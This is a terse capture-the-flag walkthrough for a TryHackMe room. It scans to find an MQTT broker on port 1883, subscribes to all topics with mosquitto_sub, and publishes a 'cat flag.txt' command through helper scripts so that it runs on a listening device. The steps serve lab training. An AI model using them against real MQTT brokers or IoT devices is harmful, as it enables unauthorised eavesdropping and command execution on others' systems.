# Bugged

[Bugged](https://tryhackme.com/room/bugged)

## Solution

- nmap scan: 1883

### Mosquitto

```
mosquitto_sub -v -h $IP -p 1883 -t '#'
```

### Flag

```
./sub.sh $IP
```

```
./pub.sh $IP CMD cat flag.txt
```
